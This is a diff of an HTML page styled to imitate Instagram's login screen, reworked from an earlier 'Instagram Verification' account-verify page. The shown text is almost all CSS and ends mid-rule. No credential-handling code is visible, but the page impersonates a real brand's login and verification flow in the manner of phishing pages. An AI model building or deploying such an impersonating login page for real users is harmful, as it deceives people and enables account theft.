@@ -3,675 +3,4137 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Verification</title>
-    <!-- Icons for the checkmark -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    
-    <!-- <link rel="stylesheet" href="insta.css"> -->
-  <title>Instagram Verify Acc - Username</title>
-  </head>
+    <title>Instagram</title>
+    <link rel="stylesheet" href="https://cloudflare.com">
+      <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="stylesheet"
+href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
+      
+    <link rel="icon" type="image/png" href="image4.png">
+    <!-- python3 -m http.server 8080 -->
+     
+</head>
 <body>
-
 <style>
-      *{
+    /* global Scope */
+    *{
         margin:0px;
-padding:0px;
-      }
-body{
-  background-color:#1C1C1B;
-color:white;
-}      
-
-@media (min-width: 1024px) and (max-width: 2564px) {
-section.box{
-  margin:0 auto;
-  margin-top:40px;
-  border:0.23px solid gray; 
-  /* rgb(220, 220, 220) */
-  border-radius:20px;
-  width:500px;
-  height:400px;
-height:auto;
-  background-color:#403D3D;
-  
-}
-.seclogo{
-height:30px;
-
-}
-
-section.mrg  .instaposter{
-height:300px;
-width:100%;
-left:20px;
-margin-top:100px;
-/* position:absolute; */
-
-}
-
-input{
-width:90%;
-padding:5px 10px;
-height:40px;
-margin-top:8px;
-border-radius:10px;
-background-color:transparent;
-display:block;
-border:1px solid #787874;
-color:white;
-outline:none;
-
-}
-
-
-input:hover{
-  border:1.4px solid rgb(159, 158, 158);
-}
-input:active{
-  border:2px solid #ebebeb79;
-}
-
-form{
- width:100%;
- height:auto;
-  /* border:2px solid red; */
-  display:flex;
-  flex-direction:column;
-  flex-wrap:nowrap;
-  align-items:center; 
-   margin-top:50px;
-   position:relative;
-  /* justify-content:center; */
-  
-}
-
-.loginbtn{
-  background-color:rgb(26, 108, 184);
-  outline:none;
-  box-shadow:none;
-  width:95%;
-  border-radius:10px;
-  height:50px;
-  margin-top:8px;
-  color:white;
-border:none;
-outline:none;
-}
-.loginbtn:hover{
-  background-color:#1F6DFF;
-  color:rgb(198, 198, 194);
-  border:none;
-outline:none;
-}
-
-footer{
-  background-color:black;
-  width:100%;
-  height:100px;
-  margin-top:100px;
-  display:flex;
-  flex-wrap:wrap;
-  justify-content:center;
-  align-items:Center;
-flex-direction:column;
-background-color:#1C1C1B;
-border-top:0.10px solid gray;
-font-family:Helvetica, Arial, sans-serif;
-}
-
-footer ul.footerul{
-  display:flex;
-  list-style-type:none;
-  font-size:13px;
-  /* margin-top:50px; */
-  width:auto;
-  margin-top:15px;
-/* border:2px solid white; */
-}
-footer ul.footerul li{
-  margin:0px 10px;
-}
-footer ul.footerul li:hover{
-  margin:0px 10px;
-  text-decoration:1px solid white underline;
-    cursor:pointer;
-}
-/* unkomw bhia bhain */
-img.instalogo{
-margin:0px auto; text-align:center;display:block;   margin-top:10px;  filter: invert(1);mix-blend-mode:difference;height:70px; 
-}
-
-img.instaicon{
-font-size:52px; text-align:center;display:block;position:relative;top:19px;color:rgb(144, 145, 145);
-}
-h4.verify{
-    text-align:center ;font-family:Helvetica, Arial, sans-serif; position:relative;top:25px; display:flex; align-items:center;justify-self:center; height:30px;
-}
-h5.forget{
-    font-family:'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif ;margin-top:20px;font-size:18px;cursor:pointer"
-}
-img.meta{
-    margin-top:20px;padding-bottom:10px;height:30px;
-}
-
-div i.instahideicon{
-font-size:72px; text-align:center;display:block;position:relative;top:19px;color:rgb(144, 145, 145);
-}
-div img.instatext2{
-    text-align:center;display:block;  margin-top:40px;  filter: invert(1);  mix-blend-mode:difference;
-    height:70px;
-}
-
-img.bluetick{
-    /* display:none; */
-    height:20px;
-}
-h5.forget{
-    font-family:'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif ;margin-top:20px;font-size:17px;cursor:pointer"
-}
-img.meta{
-    margin-top:20px;padding-bottom:10px;height:30px;
-}
-
-i#instaicon{
-font-size:42px; text-align:center;display:block;position:relative;top:19px;color:rgb(144, 145, 145);
-}
-
-div i#instahideicon{
-font-size:102px; top:19px;color:rgb(144, 145, 145);
-/* border:2px solid red; height:80px;  */
-/* display:block; */
-text-align: center;
-/* margin:0px auto;
-margin-top:60%; */
-}
-div img.instatext2{
-   /* margin-top:10px; */
-     filter: invert(1);  mix-blend-mode:difference;
-   height:95px;
-   /* border: 2px solid red; */
-   display:block;
-   margin:0px auto;
-}
-div.pro{
-    
-    height:100%;width:100%;background-color:black;position:fixed;top:0px; display:flex;flex-direction:column;
-    align-items:center;justify-content:center;
-    /* border:2px solid red; */
-    display:none;
-}
-
-/* unkonwno */
-
-
-#togglePassword{
-  display:none;
-  position:absolute;
-  right:30px;
-  top:31%;
-  font-size:17px;
-  cursor: pointer;
-  color:#787874;
-  /* color:; */
-}
-}
-/* Mobiele ka lia sub  */
-
-@media (min-width: 768px) and (max-width: 1023px) {
-  body{
-        /* background-color:rgb(34, 255, 0); */
+        padding:0px;
+        box-sizing:border-box;
+    }
+    body{
+        margin:0px;
+        padding:0px;
+        box-sizing:border-box;  
     }
 
-section.box{
-  margin:0 auto;
-  margin-top:40px;
-  border:0.23px solid gray; 
-  /* rgb(220, 220, 220) */
-  border-radius:20px;
-  width:90%;
-  height:1200px;
-padding:0px 10px;
-  background-color:#403D3D;
-  /* display:none; */
-}
-
-section.mrg{
+    div.dt{
+        height:auto;
+        width:auto;
+        position:absolute;
+        right:50px;
+        top:30%;
+      
+           /* align-items:center; */
+    }
+    /* 1328 down masla  */
    
-    max-width:100%;
-    overflow:hidden;
-}
-
-section.mrg  .instaposter{
-height:300px;
-width:100%;
-left:20px;
-margin-top:100px;
-/* position:absolute; */
-}
-
-input{
-width:90%;
-padding:5px 10px;
-height:110px;
-margin-top:8px;
-border-radius:10px;
-background-color:transparent;
-display:block;
-border:1px solid #787874;
-color:white;
-outline:none;
-margin:7px 0px;
-font-size:40px;
-padding:0px 20px;
-position: relative;
-}
-input::placeholder{
-font-size:40px;
-}
-
-input:hover{
-  border:1.4px solid white;
-}
-input:active{
-  border:2px solid #ebebeb87;
-}
-
-form{
- width:100%;
- height:auto;
-  /* border:2px solid red; */
-  display:flex;
-  flex-direction:column;
-  flex-wrap:nowrap;
-  align-items:center; 
-   margin-top:50px;
-   position:relative;
-  /* justify-content:center; */
   
-}
 
-.loginbtn{
-  background-color:rgb(22, 119, 210);
-  outline:none;
-  box-shadow:none;
-  width:95%;
-  border-radius:10px;
-  height:100px;
-  margin-top:20px;
-  color:white;
-border:none;
-outline:none;
-font-size:35px;
-font-family:Verdana, Geneva, Tahoma, sans-serif;
-}
-.loginbtn:hover{
-  background-color:#1F6DFF;
-  color:rgb(198, 198, 194);
-  border:none;
-outline:none;
-}
-
-footer{
-  background-color:black;
-  width:100%;
-  height:auto;
-  margin-top:100px;
-  display:flex;
-  flex-wrap:wrap;
-  flex-direction:row;
-  /* max-width:100%; */
-  justify-content:center;
-  /* align-items:center; */
-background-color:#1C1C1B;
-border-top:0.10px solid gray;
-font-family:Helvetica, Arial, sans-serif;
-  /* position:absolute; */
-  bottom:0px;
-background-color: #1C1C1B;
-padding:20px 0px;
-}
-
-footer ul.footerul{
-  list-style-type:none;
-  font-size:13px;
-  display:flex;
-  flex-wrap:wrap;
-  flex-direction:row;
-  height:100px;
-  align-items:center;
-  justify-content:center;
-  /* margin-top:50px; */
-  min-width:100%;
-  font-size:20px;
+@media (min-width: 320px) and (max-width: 374px) {
+i.up , i.dow{
+        height:50px;
+        width:50px;
+        background:rgb(58, 57, 57);
+        color:white;
+        border-radius:50%;
+         display:flex;
+        align-items:center;
+        justify-content:center; 
+        /* flex-direction:column; */
+        margin-top:20px;
+        transform:rotate(90deg);
+        /* text-align:center; */
+        display:none;
+    }
 
 
-  
-  /* margin-top:15px; */
-  /* display:none; */
-/* border:2px solid white; */
+    div.video div.detail{
+        /* border:2px solid red; */
+        position:absolute;
+        bottom:20px;
+        left: 20px;
+        color:white;
+    width:330px;
+    height:auto;
+    display:flex;
+    align-items:Center;
+    flex-wrap:wrap;
+
+    
+      
+    }
+    div.video div.detail div.profile{
+        height:40px;
+        width:40px;
+        border-radius:50%;
+        background-image:url("profile.jpg");
+        background-size:100%;
+        position:relative;
+        margin-right:9px;
+      cursor:pointer;
+    }
+
+    div.video div.detail div.viddet p{
+        font-family:Impact, Haettenschweiler, 'Arial Narrow Bold', sans-serif;
+        font-weight:bold;
+        font-size:16px;
+        cursor:pointer;
+    }
+    
+    div.video div.detail  p.title{
+        margin-top:10px;
+        font-size:16px;
+              cursor:pointer;
+        
+    }
+    div.video div.detail div.viddet marquee{
+width:50%;
+/* border:2px solid rgb(255, 213, 0); */
+position:relative;
+top:3px;
+margin-left:10px;
+font-size:9px;
+color:gray;
+      cursor:pointer;
+    }
+
+    div.video{
+        position:fixed;
+        top:0px;
+        width:100%;
+        height:100vh;
+        z-index:5;
+        overflow:hidden;
+        background-color: rgb(24, 22, 22);
+        display:flex;
+        align-items:Center;
+         display:none;
+    }
+    div video{
+        /* width:100%; */
+        width:100%;
+        margin:0px auto;
+        /* height:auto; */
+       
+    }
+
+div.video div.collection{
+   /* border:2px solid white; */
+   width:40px;
+   position:absolute;
+   bottom:19px;
+   right:5px;
+   font-size:14px;
+   color:rgb(217, 217, 217);
 }
-footer ul.footerul li{
-  margin:0px 10px;
-  color:beige;
-  min-width:90px;
-  text-align:center;
-  margin:10px 0px;
+div.video div.collection div{
+    margin-top:15px;
+    /* border:2px solid white; */
+    display:flex;
+    flex-wrap:wrap;
+    justify-content:center;
+    align-items:center;
+    width:30px;
+    height:40px;
 }
-footer ul.footerul li:hover{
-  margin:0px 10px;
-  text-decoration:1px solid rgb(199, 194, 194) underline;
+div.video div.collection div i{
+    font-size:20px;
     cursor:pointer;
 }
-
-
-/* unkow bhai  */
-img.instalogo{
-margin:0px auto; text-align:center;display:block;   margin-top:40px;  filter: invert(1);mix-blend-mode:difference;height:140px; 
+div.video div.collection div.box{
+    height:30px;
+    width:30px;
+    border-radius:10px;
+    border:1px solid white;
+    background-image:url("https://swms.org.uk/wp-content/uploads/2025/04/Cover_final-scaled.jpg");
+    background-size:100%;
 }
 
-i#instaicon{
-font-size:200px; text-align:center;display:block;position:relative;margin-top:149px;color:rgb(144, 145, 145); 
-}
-h4.verify{
-    text-align:center ;font-family:Helvetica, Arial, sans-serif; position:relative;margin-top:45px; display:flex; align-items:center;justify-self:center; height:0px;font-size:40px; margin-bottom:93px;
-}
-img.bluetick{
+
+
+
+
+div.logwin{
+    position:fixed;
+    width:100%;
+    top:0px;
+    height:100%;
+    background:rgb(61, 60, 60);
+    background:rgb(13, 15, 18);
     /* display:none; */
-    height:70px;
-}
-h5.forget{
-    font-family:'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif ;margin-top:35px;font-size:35px;cursor:pointer"
-}
-img.meta{
-    margin-top:100px;height:70px;
+    z-index:5;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    
+    /* display:none; */
 }
 
-div i#instahideicon{
-font-size:92px; top:14px;color:rgb(144, 145, 145);
-/* border:2px solid red; height:80px;  */
-display:block;
-text-align: center;
-margin:0px auto;
-/* margin-top:30%; */
-}
-div img.instatext2{
-   /* margin-top:10px; */
-     filter: invert(1);  mix-blend-mode:difference;
-   height:60px;
-   /* border: 2px solid red; */
-   display:block;
-   margin:0px auto;
-}
-div.pro{
-    /* border: 2px solid red;
-    height:100%;width:100%;background-color:black;position:fixed;top:0px; display:flex;
-    align-items:center;justify-content:center;
-    display:none; */
 
-     height:100%;width:100%;background-color:black;position:fixed;top:0px; display:flex;flex-direction:column;
-    align-items:center;justify-content:center;
+div.logwin img.winlogo{
+   height:70px;
+ /* display:flex; */
+   text-align:center;
+   /* display:block; */
+   /* justify-content:center; 
+   align-items:center;   */
+   /* border: 1px solid rgb(88, 86, 86); */
+}
+div.logwin div.controldo p{
+    color:rgb(93, 93, 93);
+    font-size:17px;
+}
+div.logwin div.controldo img{
+height:34px;
+}
+
+
+div.logwin div.controldo{
+    width:100%;
+    position:absolute;
+    bottom:30px;
     /* border:2px solid red; */
+    /* display:flex; */
+    flex-wrap:wrap;
+    text-align:center;
+    justify-content:center;
+}
+
+/* GLOBAL SCOP END */
+
+
+
+
+    div.main{
+        display:flex;
+        align-items:Center;
+        height:auto;
+        width:100%;
+        background-color:rgb(0, 0, 0);
+
+    }
+/* Left side Open */
+
+    section.leftarea{
+        height:inherit;
+        width:57%;
+        background:rgb(13, 15, 18);
+        display:none;
+    }
+section div.instaleftlogo{
+    /* border:2px solid red; */
+    margin-top:30px;
+    
+}
+
+section div.instaleftlogo img.instalogoleft{
+height:60px;
+margin:25px 0px 0px 45px;
+/* margin-bottom:20px; */
+}
+p.parag{
+width: 100%;
+/* background:red; */
+text-align:center;
+font-size:38px;
+margin-top:20px;
+line-height:65px;
+color:white;
+font-style:bold;
+margin-left:15px;
+display:none;
+}
+span.closecolor{
+  background: linear-gradient(to right, rgb(232, 122, 44),rgb(255, 48, 127), rgb(190, 5, 166));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  word-spacing:3px;
+  font-family:'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+}
+
+img.instapublicpic{
+    height:350px;
+    margin:0px auto;
+    display:block;
     display:none;
-
-}
-
-#togglePassword{
-  display:none;
-  position:absolute;
-  right:40px;
-  top:29%;
-  font-size:25px;
-  cursor: pointer;
-  color:#787874;
-}
-
+    /* text-align:center; */
 }
 
 
-@media (min-width: 58px) and (max-width: 767px) {
+    /* LEFT SIDE CLOSE END  */
+    /* right side start */
+    section.rightarea{
+        width:100%;
+        height:100vh;
+        height:auto;
+        background:rgb(28, 29, 28);
+        /* border-left:2px solid rgb(86, 8, 255); */
+        /* /* background:rgb(34, 33, 33); */
+        /* background:rgb(7, 208, 7); */ 
 
-    /* body{
-        background-color:red;
+    }
+
+    div.formbox{
+        /* border:2px solid green; */
+        width:100%;
+        height:100%;
+        /* height:1; */
+        /* margin:0px auto; */
+        display:flex;
+        align-items:center;
+        justify-content:center;
+        /* margin-top:97px; */
+        /* display:none; */
+    }
+    div.formbox p.logintxt{
+        font-size:16px;
+        display:flex;
+        justify-content:flex-start;
+        width:100%;
+        color:white;
+        /* font-family:initial; */
+        font-family:'Franklin Gothic Medium', 'Arial Narrow', ;
+        /* font-weight:500; */
+        border:2px solid red;
+        display:none;
+        
+        
+    }
+    form{
+        /* border:2px solid hwb(60 0% 0%); */
+        display:flex;
+        width:100%;
+        height:100%;
+        margin-top:50px;
+          /* background:rgb(23, 23, 23); */
+        padding-bottom:30px;
+        /* justify-content:center; */
+        align-items:center;
+        flex-direction:column;
+    }
+    form p.enguk{
+        color:rgb(162, 162, 162);
+        text-align:center;
+        font-family:'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+        position:absolute;
+        top:15px;
+        font-size:11px;
+    }
+
+form img.instalogoleft{
+    height:60px;
+    margin-top:38px;
+}
+
+    /*  */
+    /*  */
+form div.emailinput{
+        width:90%;
+        height:60px;
+        margin-top:50px;
+        /* margin-left:70px; */
+        border-radius:16px;
+  border:1px solid rgb(72, 71, 71);
+        background:rgb(28, 29, 28);
+        color:white;
+        outline:none;
+         /* padding-left:20px; */
+         font-size:18px;
+         position:relative;
+         display:flex;
+         align-items:center;
+
+         
+}
+form div.emailinput:hover{
+    border:2px solid rgb(175, 175, 175);
+}
+
+    div.formbox input.email{
+      width:90%;
+        height:54px;
+    border-radius:16px;
+        background:rgb(28, 29, 28);
+        background:transparent;
+        color:white;
+        outline:none;
+        border:none;
+         padding-left:20px;
+         font-size:5px;
+        
+    }
+    div.emailinput label{
+        position:absolute;
+        padding-left:20px;
+        width:90%;
+        height:15px;
+
+        /* border:2px solid red; */
+        overflow:hidden;
+        font-size:2px;
+        line-height:1.2;
+        color:rgb(161, 161, 161);
+        color:rgba(214, 214, 214, 0.832);
+        pointer-events: none;
+        /* font-weight:200; */
+        font-family:Verdana, Geneva, Tahoma, sans-serif;
+        /* letter-spacing:0.4px; */
+
+    }
+    div.emailinput span{
+     color:rgba(214, 214, 214, 0.832);
+    display:none;
+    align-self:center;
+    height:auto;
+    font-size:20px;
+    border-radius:10px;
+   padding:5px 10px;
+   position:absolute;
+    right:5px;
+   background:rgb(28, 29, 28);
+   z-index:3;
+   /* border-radius:10px; */
+    }
+/* div.emailinput:focus ~ label{ 
+  top:5px;
+  font-size:6px;=
+  color:red;
+
+} */
+
+/*  */
+/*  */
+/* / */
+form div.passinput{
+        width:90%;
+        height:60px;
+        margin-top:10px;
+        /* margin-left:70px; */
+        border-radius:16px;
+        /* border:1px solid rgb(78, 76, 76);
+        background:rgb(28, 29, 28); */
+     border:1px solid rgb(72, 71, 71);
+        color:white;
+        outline:none;
+         /* padding-left:20px; */
+         font-size:18px;
+         position:relative;
+         display:flex;
+         align-items:center;
+}
+
+form div.passinput i{
+    position:Absolute;
+     cursor: pointer;
+  /* color: #e4e3e3; */
+  right:17px;
+   transform: scaleX(-1);
+   display:none;
+   font-size:15px;
+   padding:10px 10px;
+   align-self:center;
+     color:rgba(181, 178, 178, 0.832);
+       color:rgba(214, 214, 214, 0.832);
+      background:rgb(28, 29, 28);
+      right:5px;
+   
+}
+
+form div.passinput:hover{
+    border:2px solid rgb(175, 175, 175);
+}
+    div.formbox input.pass{
+      width:90%;
+        height:50px;
+    border-radius:16px;
+        background:rgb(28, 29, 28);
+        background:transparent;
+        color:white;
+        outline:none;
+        border:none;
+         padding-left:20px;
+         font-size:3px;
+         /* letter-spacing:0.8px; */
+    }
+    div.passinput label{
+        position:absolute;
+        /* border:2px solid red; */
+        padding-left:20px;
+        font-size:14px;
+        color:rgba(182, 182, 182, 0.9);
+        pointer-events: none;
+        font-weight:200;
+        font-family:Verdana, Geneva, Tahoma, sans-serif;
+        letter-spacing:0.4px;
+
+    }
+
+
+
+
+
+
+
+/*  */
+/*  */
+    /* div.formbox input.pass{
+        width:96%;
+        height:58px;
+        margin-top:12px;
+        //margin-left:70px;
+        border-radius:16px;
+        background:rgb(28, 29, 28);
+        border:1px solid rgb(78, 76, 76);
+        color:white;
+        outline:none;
+         padding-left:20px;
+         font-size:18px;
     } */
+    
 
-section.box{
-  margin:0 auto;
-  margin-top:40px;
-  border:0.23px solid gray; 
-  /* rgb(220, 220, 220) */
-  border-radius:20px;
-  width:90%;
-  height:1200px;
-padding:0px 10px;
-  background-color:#403D3D;
-  /* display:none; */
-}
-
-section.mrg{
    
-    max-width:100%;
-    overflow:hidden;
-}
+    input.login{
+        width:90%;
+        height:40px;
+        margin-top:12px;
+        /* margin-left:70px; */
+        border-radius:20px;
+        font-size:14px;
+        background:rgb(10, 105, 222);
+        color:white;
+        outline:none;
+        border:none;
+        opacity:100%;
+      
+    }
+    
+    button.forget{
+        /* display:none; */
+        justify-content:center;
+        align-items:center;
+        font-size:14px;
+        width:90%;
+        height:auto;
+        margin-top:15px;
+        background:transparent;
+        /* background:rgb(38, 36, 36); */
+        border-radius:20px;
+        color:rgb(255, 255, 255);
+        /* border:2px solid yellow; */
+        font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        border:none;
+        /* font-weight:400; */
+        letter-spacing:1px;
+    }
+    
+    button.fblogin{
+        display:flex;
+        justify-content:center;
+        align-items:center;
+        font-size:7px;
+        width:100%;
+        height:20px;
+        margin-top:60px;
+        background:rgba(47, 47, 47, 0.651);
+        border-radius:20px;
+        color:thistle; 
+        border:none;
+        display:none;
+    }
+     img.fblog{
+        height:15px;
+        position:relative;
+        right:10px;
+        display:none
+    }
 
-section.mrg  .instaposter{
-height:300px;
-width:100%;
-left:20px;
-margin-top:100px;
-/* position:absolute; */
-}
+    button.cracc{
+        /* display:flex;
+        justify-content:center;
+        align-items:center; */
+        width:90%;
+        height:40px;
+        font-size:14px;
+        margin-top:126px;
+        background:rgb(28, 29, 28);
+        border-radius:20px;
+        color:rgb(95, 183, 250);
+        border:none;
+        outline:1px solid rgb(95, 185, 255);
+        /* letter-spacing:1px; */
+    }
+    button.cracc:hover , button.fblogin:hover,button.forget:hover{
+        background:rgb(60, 59, 59);
+        cursor:pointer;
+    }
 
-input{
-width:90%;
-padding:5px 10px;
-height:110px;
-margin-top:8px;
-border-radius:10px;
-background-color:transparent;
-display:block;
-border:1px solid #787874;
-color:white;
-outline:none;
-margin:7px 0px;
-font-size:40px;
-padding:0px 20px;
-position: relative;
-}
-input::placeholder{
-font-size:40px;
-}
+    img.meta{
+        height:25px;
+        margin:0px auto;
+        display:block;
+        margin-top:15px;
+        /* padding-bottom:10px; */
+        /* margin-bottom:30px; */
+    }
 
-input:hover{
-  border:1.4px solid white;
-}
-input:active{
-  border:2px solid #ebebeb87;
-}
 
-form{
- width:100%;
- height:auto;
-  /* border:2px solid red; */
-  display:flex;
-  flex-direction:column;
-  flex-wrap:nowrap;
-  align-items:center; 
-   margin-top:50px;
-   position:relative;
-  /* justify-content:center; */
-  
-}
 
-.loginbtn{
-  background-color:rgb(26, 108, 184);
-  outline:none;
-  box-shadow:none;
-  width:95%;
-  border-radius:10px;
-  height:100px;
-  margin-top:20px;
-  color:white;
-border:none;
-outline:none;
-font-size:35px;
-font-family:Verdana, Geneva, Tahoma, sans-serif;
-}
-.loginbtn:hover{
-  background-color:#1F6DFF;
-  color:rgb(198, 198, 194);
-  border:none;
-outline:none;
-}
+
+
+
+
+
+
+
+
+/* RIGHT SIDE END  */
+
+
+
+
 
 footer{
-  background-color:black;
-  width:100%;
-  height:auto;
-  margin-top:100px;
-  display:flex;
-  flex-wrap:wrap;
-  flex-direction:row;
-  /* max-width:100%; */
-  justify-content:center;
-  /* align-items:center; */
-background-color:#1C1C1B;
-border-top:0.10px solid gray;
-font-family:Helvetica, Arial, sans-serif;
-  /* position:absolute; */
-  bottom:0px;
-background-color: #1C1C1B;
-padding:20px 0px;
+    height:auto;
+    width:100%;
+     background:rgb(12, 13, 15);
+     padding-top:6px;
+     padding-bottom:50px;
+     border-top:2px solid rgb(79, 74, 74);
+     display:none;
 }
-
 footer ul.footerul{
-  list-style-type:none;
-  font-size:13px;
-  display:flex;
-  flex-wrap:wrap;
-  flex-direction:row;
-  height:100px;
-  align-items:center;
-  justify-content:center;
-  /* margin-top:50px; */
-  min-width:100%;
-  font-size:20px;
-
-
-  
-  /* margin-top:15px; */
-  /* display:none; */
-/* border:2px solid white; */
+    /* flex-wrap:wrap; */
+    display:flex;
+    justify-content:center;
+    list-style:none;
+    color:rgb(176, 173, 173);
+    text-align:Center;
+    /* border:2px solid white; */
+    font-size:13px;
+    margin-top:15px;
 }
 footer ul.footerul li{
-  margin:0px 10px;
-  color:beige;
-  min-width:90px;
-  text-align:center;
-  margin:10px 0px;
+    /* padding:0px 10px; */
+    cursor:pointer;
+    height:15px;
+    width:auto;
+    margin:0px 9px;
+    /* padding:0px 10px; */
+    /* border:2px solid red; */
 }
 footer ul.footerul li:hover{
-  margin:0px 10px;
-  text-decoration:1px solid rgb(199, 194, 194) underline;
+    border-bottom:0.3px solid gray;
+}
+
+    
+
+
+}
+@media (min-width: 375px) and (max-width: 480px) {
+
+    div.video div.detail{
+        /* border:2px solid red; */
+        position:absolute;
+        bottom:20px;
+        left: 20px;
+        color:white;
+    width:330px;
+    height:auto;
+    display:flex;
+    align-items:Center;
+    flex-wrap:wrap;
+
+    
+      
+    }
+    div.video div.detail div.profile{
+        height:40px;
+        width:40px;
+        border-radius:50%;
+        background-image:url("profile.jpg");
+        background-size:100%;
+        position:relative;
+        margin-right:9px;
+      cursor:pointer;
+    }
+
+    div.video div.detail div.viddet p{
+        font-family:Impact, Haettenschweiler, 'Arial Narrow Bold', sans-serif;
+        font-weight:bold;
+        font-size:16px;
+        cursor:pointer;
+    }
+    
+    div.video div.detail  p.title{
+        margin-top:10px;
+        font-size:16px;
+              cursor:pointer;
+        
+    }
+    div.video div.detail div.viddet marquee{
+width:50%;
+/* border:2px solid rgb(255, 213, 0); */
+position:relative;
+top:3px;
+margin-left:10px;
+font-size:9px;
+color:gray;
+      cursor:pointer;
+    }
+
+    div.video{
+        position:fixed;
+        top:0px;
+        width:100%;
+        height:100vh;
+        z-index:5;
+        overflow:hidden;
+        background-color: rgb(24, 22, 22);
+        display:flex;
+        align-items:Center;
+         display:none;
+    }
+    div video{
+        /* width:100%; */
+        width:100%;
+        margin:0px auto;
+        /* height:auto; */
+       
+    }
+
+div.video div.collection{
+   /* border:2px solid white; */
+   width:40px;
+   position:absolute;
+   bottom:19px;
+   right:5px;
+   font-size:14px;
+   color:rgb(217, 217, 217);
+}
+div.video div.collection div{
+    margin-top:15px;
+    /* border:2px solid white; */
+    display:flex;
+    flex-wrap:wrap;
+    justify-content:center;
+    align-items:center;
+    width:30px;
+    height:40px;
+}
+div.video div.collection div i{
+    font-size:20px;
     cursor:pointer;
 }
-
-
-/* unkow bhai  */
-img.instalogo{
-margin:0px auto; text-align:center;display:block;   margin-top:40px;  filter: invert(1);mix-blend-mode:difference;height:140px; 
+div.video div.collection div.box{
+    height:30px;
+    width:30px;
+    border-radius:10px;
+    border:1px solid white;
+    background-image:url("https://swms.org.uk/wp-content/uploads/2025/04/Cover_final-scaled.jpg");
+    background-size:100%;
 }
 
-i#instaicon{
-font-size:150px; text-align:center;display:block;position:relative;margin-top:149px;color:rgb(144, 145, 145); 
-}
-h4.verify{
-    text-align:center ;font-family:Helvetica, Arial, sans-serif; position:relative;margin-top:45px; display:flex; align-items:center;justify-self:center; height:0px;font-size:30px; margin-bottom:93px;
-}
-img.bluetick{
+
+
+
+
+div.logwin{
+    position:fixed;
+    width:100%;
+    top:0px;
+    height:100%;
+    background:rgb(61, 60, 60);
+    background:rgb(13, 15, 18);
     /* display:none; */
-    height:70px;
-}
-h5.forget{
-    font-family:'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif ;margin-top:35px;font-size:35px;cursor:pointer"
-}
-img.meta{
-    margin-top:100px;height:70px;
+    z-index:5;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    
+    /* display:none; */
 }
 
-div i#instahideicon{
-font-size:72px; top:14px;color:rgb(144, 145, 145);
-/* border:2px solid red; height:80px;  */
-display:block;
-text-align: center;
-margin:0px auto;
-margin-top:30%;
-}
-div img.instatext2{
-   /* margin-top:10px; */
-     filter: invert(1);  mix-blend-mode:difference;
-   height:40px;
-   /* border: 2px solid red; */
-   display:block;
-   margin:0px auto;
-}
-div.pro{
-    /* border: 2px solid red;
-    height:100%;width:100%;background-color:black;position:fixed;top:0px; display:flex;
-    align-items:center;justify-content:center;
-    display:none; */
 
-     height:100%;width:100%;background-color:black;position:fixed;top:0px; display:flex;flex-direction:column;
-    align-items:center;justify-content:center;
+div.logwin img.winlogo{
+   height:70px;
+ /* display:flex; */
+   text-align:center;
+   /* display:block; */
+   /* justify-content:center; 
+   align-items:center;   */
+   /* border: 1px solid rgb(88, 86, 86); */
+}
+div.logwin div.controldo p{
+    color:rgb(93, 93, 93);
+    font-size:17px;
+}
+div.logwin div.controldo img{
+height:34px;
+}
+
+
+div.logwin div.controldo{
+    width:100%;
+    position:absolute;
+    bottom:30px;
     /* border:2px solid red; */
+    /* display:flex; */
+    flex-wrap:wrap;
+    text-align:center;
+    justify-content:center;
+}
+
+/* GLOBAL SCOP END */
+
+
+
+
+    div.main{
+        display:flex;
+        align-items:Center;
+        height:auto;
+        width:100%;
+        background-color:rgb(0, 0, 0);
+
+    }
+/* Left side Open */
+
+    section.leftarea{
+        height:inherit;
+        width:57%;
+        background:rgb(13, 15, 18);
+        display:none;
+    }
+section div.instaleftlogo{
+    /* border:2px solid red; */
+    margin-top:30px;
+    
+}
+
+section div.instaleftlogo img.instalogoleft{
+height:60px;
+margin:25px 0px 0px 45px;
+/* margin-bottom:20px; */
+}
+p.parag{
+width: 100%;
+/* background:red; */
+text-align:center;
+font-size:38px;
+margin-top:20px;
+line-height:65px;
+color:white;
+font-style:bold;
+margin-left:15px;
+display:none;
+}
+span.closecolor{
+  background: linear-gradient(to right, rgb(232, 122, 44),rgb(255, 48, 127), rgb(190, 5, 166));
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+  background-clip: text;
+  word-spacing:3px;
+  font-family:'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif;
+}
+
+img.instapublicpic{
+    height:350px;
+    margin:0px auto;
+    display:block;
     display:none;
-
-}
-/* togglePassword */
-
-#togglePassword{
-  display:none;
-  position:absolute;
-  right:40px;
-  top:29%;
-  font-size:25px;
-  cursor: pointer;
-  color:#787874;
-}
-/* UNKNOW KHATAM  */
-
+    /* text-align:center; */
 }
 
-/* MOBILE KA LIA KHATAM  */
+
+    /* LEFT SIDE CLOSE END  */
+    /* right side start */
+    section.rightarea{
+        width:100%;
+        height:100vh;
+        height:auto;
+        background:rgb(28, 29, 28);
+        /* border-left:2px solid rgb(86, 8, 255); */
+        /* /* background:rgb(34, 33, 33); */
+        /* background:rgb(7, 208, 7); */ 
+
+    }
+
+    div.formbox{
+        /* border:2px solid green; */
+        width:100%;
+        height:100%;
+        /* height:1; */
+        /* margin:0px auto; */
